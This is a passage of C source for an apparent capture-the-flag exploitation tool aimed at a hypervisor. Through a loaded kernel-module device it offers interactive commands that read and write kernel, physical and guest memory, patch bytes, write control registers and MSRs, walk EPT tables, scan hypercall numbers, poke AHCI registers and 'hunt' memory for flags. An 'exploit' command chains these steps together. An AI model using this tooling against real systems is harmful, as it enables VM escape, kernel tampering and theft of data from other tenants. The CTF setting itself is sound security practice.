        else if (!strcmp(cmd,"rp") && a1) { unsigned long addr=parse_addr(a1); size_t len=a2?parse_size(a2):64; uint8_t *buf=malloc(len); if(buf&&mem_read_physical(addr,buf,len)==0) hexdump(buf,len,addr); else ERR("Read failed"); free(buf); }
        else if (!strcmp(cmd,"rg") && a1) { unsigned long gpa=parse_addr(a1); size_t len=a2?parse_size(a2):64; uint8_t *buf=malloc(len); if(buf&&mem_read_guest(gpa,buf,len,0)==0) hexdump(buf,len,gpa); else ERR("Read failed"); free(buf); }
        else if (!strcmp(cmd,"rpfn") && a1) { unsigned long pfn=parse_addr(a1); size_t len=a2?parse_size(a2):PAGE_SIZE; uint8_t *buf=malloc(len); if(buf&&read_pfn_data(pfn,buf,len)==0) hexdump(buf,len>256?256:len,pfn<<12); else ERR("Read failed"); free(buf); }
        else if (!strcmp(cmd,"wk") && a1 && a2) { uint8_t d[256]; int l=hex_to_bytes(a2,d,sizeof(d)); if(l>0&&mem_write_kernel(parse_addr(a1),d,l,1)==0) OK("Wrote %d bytes",l); else ERR("Write failed"); }
        else if (!strcmp(cmd,"wp") && a1 && a2) { uint8_t d[256]; int l=hex_to_bytes(a2,d,sizeof(d)); if(l>0&&mem_write_physical(parse_addr(a1),d,l,0)==0) OK("Wrote %d bytes",l); else ERR("Write failed"); }
        else if (!strcmp(cmd,"wg") && a1 && a2) { uint8_t d[256]; int l=hex_to_bytes(a2,d,sizeof(d)); if(l>0&&mem_write_guest(parse_addr(a1),d,l,0)==0) OK("Wrote %d bytes",l); else ERR("Write failed"); }
        else if (!strcmp(cmd,"fill") && a1 && a2 && a3) { unsigned long addr=parse_addr(a1); uint8_t val=strtoul(a2,NULL,0); size_t len=parse_size(a3); int t=(a4&&a4[0]=='p')?1:0; if((t?mem_set_physical:mem_set_kernel)(addr,val,len)==0) OK("Filled %zu bytes",len); else ERR("Failed"); }
        else if (!strcmp(cmd,"patch") && a1 && a2) { uint8_t d[32]; int l=hex_to_bytes(a2,d,sizeof(d)); int t=(a3&&a3[0]=='p')?1:0; if(l>0&&mem_patch(parse_addr(a1),NULL,d,l,0,t)==0) OK("Patched %d bytes",l); else ERR("Failed"); }
        else if (!strcmp(cmd,"cr") && a1) { unsigned long v; if(read_cr(atoi(a1),&v)==0) printf("CR%s = 0x%016lx\n",a1,v); else ERR("Failed"); }
        else if (!strcmp(cmd,"wcr") && a1 && a2) { if(write_cr(atoi(a1),parse_addr(a2),0)==0) OK("CR%s set",a1); else ERR("Failed"); }
        else if (!strcmp(cmd,"msr") && a1) { uint64_t v; if(read_msr(strtoul(a1,NULL,0),&v)==0) printf("MSR 0x%s = 0x%016lx\n",a1,v); else ERR("Failed"); }
        else if (!strcmp(cmd,"wmsr") && a1 && a2) { if(write_msr(strtoul(a1,NULL,0),strtoull(a2,NULL,0))==0) OK("MSR set"); else ERR("Failed"); }
        else if (!strcmp(cmd,"pt") && a1) { struct page_table_dump pt; if(dump_page_tables(parse_addr(a1),&pt)==0) printf("PML4E: 0x%lx PDPTE: 0x%lx PDE: 0x%lx PTE: 0x%lx Phys: 0x%lx\n",pt.pml4e,pt.pdpte,pt.pde,pt.pte,pt.physical_addr); else ERR("Failed"); }
        else if (!strcmp(cmd,"gregs")) { struct guest_registers gr; if(read_guest_regs(&gr)==0) { printf("RAX=%lx RBX=%lx RCX=%lx RDX=%lx RSI=%lx RDI=%lx\n",gr.rax,gr.rbx,gr.rcx,gr.rdx,gr.rsi,gr.rdi); printf("RIP=%lx CR3=%lx\n",gr.rip,gr.cr3); } else ERR("Failed"); }
        else if (!strcmp(cmd,"v2p") && a1) { unsigned long p,f; if(conv_virt_to_phys(parse_addr(a1),&p,&f)==0) printf("0x%lx -> Phys 0x%lx PFN 0x%lx\n",parse_addr(a1),p,f); else ERR("Failed"); }
        else if (!strcmp(cmd,"p2v") && a1) { unsigned long v; if(conv_phys_to_virt(parse_addr(a1),&v)==0) printf("0x%lx -> 0x%lx\n",parse_addr(a1),v); else ERR("Failed"); }
        else if (!strcmp(cmd,"v2pfn") && a1) { unsigned long f; if(conv_virt_to_pfn(parse_addr(a1),&f)==0) printf("0x%lx -> PFN 0x%lx\n",parse_addr(a1),f); else ERR("Failed"); }
        else if (!strcmp(cmd,"gpa2hva") && a1) { unsigned long h; if(conv_gpa_to_hva(parse_addr(a1),&h)==0) printf("GPA 0x%lx -> HVA 0x%lx\n",parse_addr(a1),h); else ERR("Failed"); }
        else if (!strcmp(cmd,"gfn2hva") && a1) { unsigned long h; if(conv_gfn_to_hva(parse_addr(a1),&h)==0) printf("GFN 0x%lx -> HVA 0x%lx\n",parse_addr(a1),h); else ERR("Failed"); }
        else if (!strcmp(cmd,"gfn2pfn") && a1) { unsigned long p; if(conv_gfn_to_pfn(parse_addr(a1),&p)==0) printf("GFN 0x%lx -> PFN 0x%lx\n",parse_addr(a1),p); else ERR("Failed"); }
        else if (!strcmp(cmd,"hva2pfn") && a1) { unsigned long p; if(conv_hva_to_pfn(parse_addr(a1),&p)==0) printf("HVA 0x%lx -> PFN 0x%lx\n",parse_addr(a1),p); else ERR("Failed"); }
        else if (!strcmp(cmd,"pfn2hva") && a1) { unsigned long h; if(conv_pfn_to_hva(parse_addr(a1),&h)==0) printf("PFN 0x%lx -> HVA 0x%lx\n",parse_addr(a1),h); else ERR("Failed"); }
        else if (!strcmp(cmd,"page2pfn") && a1) { unsigned long p; if(conv_page_to_pfn(parse_addr(a1),&p)==0) printf("Page 0x%lx -> PFN 0x%lx\n",parse_addr(a1),p); else ERR("Failed"); }
        else if (!strcmp(cmd,"pfn2page") && a1) { unsigned long p; if(conv_pfn_to_page(parse_addr(a1),&p)==0) printf("PFN 0x%lx -> Page 0x%lx\n",parse_addr(a1),p); else ERR("Failed"); }
        else if (!strcmp(cmd,"spte") && a1) { struct spte_to_pfn_request r; if(conv_spte_to_pfn(parse_addr(a1),&r)==0) printf("SPTE 0x%lx: PFN=0x%lx Flags=0x%lx P=%d W=%d X=%d\n",r.spte,r.pfn,r.flags,r.present,r.writable,r.executable); else ERR("Failed"); }
        else if (!strcmp(cmd,"ept") && a1 && a2) { struct ept_walk_request r; if(conv_walk_ept(parse_addr(a1),parse_addr(a2),&r)==0) printf("EPTP=0x%lx GPA=0x%lx -> HPA=0x%lx PageSize=%d\n",r.eptp,r.gpa,r.hpa,r.page_size); else ERR("Failed"); }
        else if (!strcmp(cmd,"gva") && a1 && a2) { struct gva_translate_request r; if(conv_translate_gva(parse_addr(a1),parse_addr(a2),&r)==0) printf("GVA=0x%lx CR3=0x%lx -> GPA=0x%lx HVA=0x%lx HPA=0x%lx\n",r.gva,r.cr3,r.gpa,r.hva,r.hpa); else ERR("Failed"); }
        else if (!strcmp(cmd,"sym") && a1) { printf("%s = 0x%lx\n",a1,sym_lookup(a1)); }
        else if (!strcmp(cmd,"syms")) { printf("Symbol count: %u\n",sym_count()); }
        else if (!strcmp(cmd,"symf") && a1) { struct symbol_request r; if(sym_find(a1,&r)==0) printf("%s = 0x%lx (%s)\n",r.name,r.address,r.description); else WARN("Not found"); }
        else if (!strcmp(cmd,"vmx")) { struct handler_info h[64]={0}; int n=get_vmx_handlers(h,64); for(int i=0;i<n&&h[i].address;i++) printf("%-32s 0x%lx\n",h[i].name,h[i].address); }
        else if (!strcmp(cmd,"svm")) { struct handler_info h[64]={0}; int n=get_svm_handlers(h,64); for(int i=0;i<n&&h[i].address;i++) printf("%-32s 0x%lx\n",h[i].name,h[i].address); }
        else if (!strcmp(cmd,"hc") && a1) { uint64_t nr=strtoull(a1,NULL,0),a[4]={0}; if(a2) a[0]=strtoull(a2,NULL,0); if(a3) a[1]=strtoull(a3,NULL,0); if(a4) a[2]=strtoull(a4,NULL,0); printf("HC %lu = 0x%lx\n",nr,hc_call(nr,a[0],a[1],a[2],0)); }
        else if (!strcmp(cmd,"hcb")) { struct hypercall_batch_request b; if(hc_batch(&b)==0) printf("100: 0x%lx\n101: 0x%lx\n102: 0x%lx\n103: 0x%lx\n",b.r100,b.r101,b.r102,b.r103); }
        else if (!strcmp(cmd,"hcd")) { int t; if(hc_detect(&t)==0) printf("Type: %d (%s)\n",t,t==1?"VMCALL":t==2?"VMMCALL":"Unknown"); }
        else if (!strcmp(cmd,"hcs") && a1 && a2) { uint64_t s=strtoull(a1,NULL,0),e=strtoull(a2,NULL,0); for(uint64_t n=s;n<=e;n++) { uint64_t r=hc_call(n,0,0,0,0); if(r!=(uint64_t)-1&&r!=(uint64_t)-38&&r!=(uint64_t)-22) printf("%3lu: 0x%lx\n",n,r); } }
        else if (!strcmp(cmd,"ainit")) { if(ahci_init()==0) OK("AHCI init"); else ERR("Failed"); }
        else if (!strcmp(cmd,"ainfo")) { struct ahci_info i; if(ahci_info(&i)==0) printf("CAP=0x%x GHC=0x%x PI=0x%x VS=0x%x\n",i.cap,i.ghc,i.pi,i.vs); else ERR("Failed"); }
        else if (!strcmp(cmd,"ar") && a1 && a2) { uint32_t v; if(ahci_read_reg(atoi(a1),strtoul(a2,NULL,0),&v)==0) printf("0x%08x\n",v); else ERR("Failed"); }
        else if (!strcmp(cmd,"aw") && a1 && a2 && a3) { if(ahci_write_reg(atoi(a1),strtoul(a2,NULL,0),strtoul(a3,NULL,0))==0) OK("Written"); else ERR("Failed"); }
        else if (!strcmp(cmd,"afis") && a1 && a2) { if(ahci_set_fis(atoi(a1),strtoull(a2,NULL,0),a3?strtoull(a3,NULL,0):0)==0) OK("FIS set"); else ERR("Failed"); }
        else if (!strcmp(cmd,"wbinvd")) { if(cache_wbinvd()==0) OK("WBINVD"); else ERR("Failed"); }
        else if (!strcmp(cmd,"clflush") && a1) { if(cache_clflush(parse_addr(a1))==0) OK("CLFLUSH 0x%lx",parse_addr(a1)); else ERR("Failed"); }
        else if (!strcmp(cmd,"wflush") && a1 && a2) { uint8_t d[256]; int l=hex_to_bytes(a2,d,sizeof(d)); int t=(a3&&a3[0]=='p')?1:0; if(l>0&&cache_write_flush(parse_addr(a1),d,l,t)==0) OK("W+F %d bytes",l); else ERR("Failed"); }
        else if (!strcmp(cmd,"sysinfo")) print_sysinfo();
        else if (!strcmp(cmd,"hunt")) { unsigned long s=a1?parse_addr(a1):0, z=a2?parse_size(a2):256*1024*1024; hunt_flags(s,z,1); }
        else if (!strcmp(cmd,"huntk")) { init_sysinfo(); hunt_flags(g_sys.kaslr.kernel_base,256*1024*1024,0); }
        else if (!strcmp(cmd,"hcflags")) extract_hc_flags();
        else if (!strcmp(cmd,"exploit")) { print_sysinfo(); extract_hc_flags(); hunt_flags(0,256*1024*1024,1); }
        else if (cmd[0]) WARN("Unknown: %s (type 'help')",cmd);
    }
    printf("Goodbye!\n");
}

/* Main function */
int main(int argc, char *argv[]) {
    /* Set up signal handling */
    signal(SIGINT, SIG_DFL);
    
    /* Parse command line arguments */
    static struct option long_options[] = {
        {"verbose", no_argument, 0, 'v'},
        {"quiet", no_argument, 0, 'q'},
        {"no-color", no_argument, 0, 'n'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    while ((opt = getopt_long(argc, argv, "vqnh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'v': g_verbose = 1; break;
            case 'q': g_quiet = 1; break;
            case 'n': g_color = 0; break;
            case 'h':
                printf("Usage: %s [options] [command]\n", argv[0]);
                printf("Options:\n");
                printf("  -v, --verbose     Verbose output\n");
                printf("  -q, --quiet       Quiet mode\n");
                printf("  -n, --no-color    Disable colored output\n");
                printf("  -h, --help        Show this help\n");
                printf("\nCommands:\n");
                printf("  (none)            Start interactive shell\n");
                printf("  sysinfo           Print system information\n");
                printf("  hunt [start] [size] Hunt for flags in physical memory\n");
                printf("  huntk             Hunt for flags in kernel memory\n");
                printf("  hcflags           Extract flags via hypercalls\n");
                printf("  exploit           Run all exploitation steps\n");
                return 0;
        }
    }
    
    /* Check if device exists */
    if (access(DEVICE_PATH, F_OK) != 0) {
        ERR("Device %s not found. Make sure the kernel module is loaded.", DEVICE_PATH);
        return 1;
    }
    
    /* Open device */
    if (dev_open() < 0) {
        return 1;
    }
    
    /* Handle command line commands */
    if (optind < argc) {
        char *cmd = argv[optind];
        if (strcmp(cmd, "sysinfo") == 0) {
            print_sysinfo();
        } else if (strcmp(cmd, "hunt") == 0) {
            unsigned long start = 0;
            size_t size = 256 * 1024 * 1024;
            if (optind + 1 < argc) start = parse_addr(argv[optind + 1]);
            if (optind + 2 < argc) size = parse_size(argv[optind + 2]);
            hunt_flags(start, size, 1);
        } else if (strcmp(cmd, "huntk") == 0) {
            init_sysinfo();
            hunt_flags(g_sys.kaslr.kernel_base, 256 * 1024 * 1024, 0);
        } else if (strcmp(cmd, "hcflags") == 0) {
            extract_hc_flags();
        } else if (strcmp(cmd, "exploit") == 0) {
            print_sysinfo();
            extract_hc_flags();
            hunt_flags(0, 256 * 1024 * 1024, 1);
        } else {
            WARN("Unknown command: %s", cmd);
            printf("Starting interactive shell instead...\n");
            interactive_shell();
        }
    } else {
        /* No arguments, start interactive shell */
        interactive_shell();
    }
    
    /* Clean up */
    dev_close();
    return 0;
}
